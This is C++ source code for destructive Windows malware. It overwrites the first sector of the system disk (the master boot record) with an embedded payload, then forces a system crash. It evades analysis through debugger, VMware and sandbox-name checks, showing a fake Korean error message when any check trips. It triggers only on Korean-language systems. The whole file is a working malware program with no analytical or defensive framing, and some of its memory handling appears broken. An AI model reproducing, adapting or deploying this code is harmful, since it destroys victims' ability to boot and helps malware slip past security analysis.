#include <Windows.h>
#include <stdio.h>
#include "Resource.h"

typedef NTSTATUS(NTAPI *TFNNtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, 
     ULONG UnicodeStringParameterMask, PULONG_PTR *Parameters, ULONG ValidResponseOption, PULONG Response); 

HINSTANCE g_hInst;

class MBRExploit{
private:
	LPVOID lpBuffer, lpRes, lpBackup;
	HANDLE hDisk;
	DWORD Bytes;

protected:
	BOOL OpenHardDisk(){
		hDisk = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
		
		if(hDisk == INVALID_HANDLE_VALUE){
			return FALSE;
		}

		return TRUE;
	}

	BOOL GetResource(){
		HRSRC hRsrc = FindResourceA(g_hInst, MAKEINTRESOURCEA(IDR_BIN1), "BIN");
		HGLOBAL hGlob = LoadResource(NULL, hRsrc);
		lpRes = LockResource(hGlob);

		if(SizeofResource(NULL, hRsrc) != 0x200){
			return FALSE;
		}

		memcpy(lpBuffer, lpRes, 0x200);
		UnlockResource(hGlob);

		return TRUE;
	}

	BOOL GetBackup(){
		SetFilePointer(hDisk, 0, 0, FILE_BEGIN);
		if(!ReadFile(hDisk, lpBackup, 0x200, &Bytes, NULL)){
			return FALSE;
		}
		return TRUE;
	}

public:
	MBRExploit(){
		VirtualAlloc(lpBuffer, 0x200, MEM_COMMIT, PAGE_READWRITE);
		VirtualAlloc(lpBackup, 0x200, MEM_COMMIT, PAGE_READWRITE);
	}
	
	~MBRExploit(){
		VirtualFree(lpBuffer, 0x200, MEM_RELEASE);
		VirtualFree(lpBackup, 0x200, MEM_RELEASE);
	}

	BOOL ExploitMBR(){
		if(!OpenHardDisk()){
			return FALSE;
		}

		if(!GetResource()){
			return FALSE;
		}

		if(!GetBackup()){
			return FALSE;
		}

		SetFilePointer(hDisk, 0, 0, FILE_BEGIN);

		if(!WriteFile(hDisk, lpBuffer, 0x200, &Bytes, NULL)){
			return FALSE;
		}

		if(!WriteFile(hDisk, lpBackup, 0x200, &Bytes, NULL)){
			return FALSE;
		}

		return TRUE;
	}
};

class SystemExploit{
protected:
	BOOL GetPrivilege(LPCSTR lpPrivilege){
		HANDLE hToken;
		struct _TOKEN_PRIVILEGES tp;
		struct _LUID luid;

		if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)){
			return FALSE;
		}

		if(!LookupPrivilegeValueA(NULL, lpPrivilege, &luid)){
			return FALSE;
		}

		tp.PrivilegeCount = 1;
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		tp.Privileges[0].Luid = luid;

		if(!AdjustTokenPrivileges(hToken, FALSE, &tp, NULL, NULL, NULL)){
			return FALSE;
		}

		return TRUE;
	}

public:
	BOOL RaiseBSOD(){
		ULONG Response;

		if(!GetPrivilege("SeShutdownPrivilege")){
			return FALSE;
		}

		TFNNtRaiseHardError pfnNtRaiseHardError = (TFNNtRaiseHardError)GetProcAddress(GetModuleHandleA("ntdll.dll"),
			"NtRaiseHardError");

		NTSTATUS status = pfnNtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &Response);

		if(SUCCEEDED(status)) return TRUE;
		return FALSE;
	}

	BOOL IsKorean(){
		if(GetSystemDefaultLangID() != 0x412)
			return FALSE;
		else
			return TRUE;
	}
};

class Anti_Reversing{
public:
	BOOL BeingDebugged(){
		if(IsDebuggerPresent()){
			ExitProcess(0);
			return TRUE;
		}
		return FALSE;	
	}

	BOOL RemoteDebugger(){
		if(CheckRemoteDebuggerPresent(GetCurrentProcess(), FALSE)){
			ExitProcess(0);
			return TRUE;
		}
		return FALSE;
	}

	BOOL IsVMWARE(){
		BOOL detected = FALSE;
		__try {
			__asm {
				MOV EAX, 0x564D5868
				MOV EBX, 0
				MOV ECX, 0xA
				MOV EDX, 0x00005658
				in EAX, DX
				CMP EBX, 0x564D5868
				setz detected
			}
			if (detected) {
				return detected;
			}
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {
			return detected;
		} //Windows don't allow user to access hardware directly
	}

	BOOL InformationThread(){
		FARPROC PtrNtSetInformationThread = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationThread");
		__asm {
			PUSH 0
			PUSH 0
			PUSH 11h // ThreadHideFromDebugger
			PUSH -2
			CALL PtrNtSetInformationThread
		}
	}

	BOOL InformationProcess(){
		FARPROC PtrNtQueryInformationProcess = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
		DWORD dwIsDebugged = 0;
		PVOID PtrIsDebugged = &dwIsDebugged;
		__asm {
			PUSH 0
			PUSH 4
			PUSH PtrIsDebugged
			PUSH 7 //means Dubug Port, it can be 1E(Debug Object) or 1F(Debug Flag)
			PUSH -1
			CALL PtrNtQueryInformationProcess
		}
		if (dwIsDebugged == -1) {
			return TRUE;
		}
		return FALSE;
	}

	BOOL UserName(){
		CHAR chBuffer[50];
		DWORD CcbBytes = sizeof(chBuffer);

		if(GetUserNameA((LPSTR)chBuffer, &CcbBytes)){

			for(int i=0; i < strlen(chBuffer); i++)
				chBuffer[i] = toupper((int)chBuffer[i]);

			if(strstr(chBuffer, "MALWARE") != NULL)
				goto detected;
			else if(strstr(chBuffer, "SANDBOX") != NULL)
				goto detected;
			else if(strstr(chBuffer, "ANALYSIS") != NULL)
				goto detected;
			else if(strstr(chBuffer, "VIRTUAL") != NULL)
				goto detected;
			else if(strstr(chBuffer, "VMWARE") != NULL)
				goto detected;
			else
				goto notfound;
		}

		detected:
				return TRUE;
		notfound:
				return FALSE;
	}
};

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpszCmdParam, int nCmdShow){
	g_hInst = hInstance;
	class Anti_Reversing anti = Anti_Reversing();

	if(anti.UserName() == TRUE){
		MessageBoxA(0, "이 프로그램은 올바른 Win32 응용 프로그램이 아닙니다.", "오류", MB_ICONERROR);
		return TRUE;
	}

	if(anti.IsVMWARE() == TRUE){
		MessageBoxA(0, "이 프로그램은 올바른 Win32 응용 프로그램이 아닙니다.", "오류", MB_ICONERROR);
		return TRUE;
	}

	if(anti.BeingDebugged()){
		MessageBoxA(0, "이 프로그램은 올바른 Win32 응용 프로그램이 아닙니다.", "오류", MB_ICONERROR);
		return TRUE;
	}

	if(anti.RemoteDebugger()){
		MessageBoxA(0, "이 프로그램은 올바른 Win32 응용 프로그램이 아닙니다.", "오류", MB_ICONERROR);
		return TRUE;
	}

	anti.InformationThread();

	if(anti.InformationProcess()){
		MessageBoxA(0, "이 프로그램은 올바른 Win32 응용 프로그램이 아닙니다.", "오류", MB_ICONERROR);
		return TRUE;
	}

	class MBRExploit mbr = MBRExploit();
	class SystemExploit system = SystemExploit();

	if(!system.IsKorean()){
		MessageBoxA(0, "이 프로그램은 올바른 Win32 응용 프로그램이 아닙니다.", "오류", MB_ICONERROR);
		return FALSE;
	}

	mbr.ExploitMBR();
	system.RaiseBSOD();

	return TRUE;
}
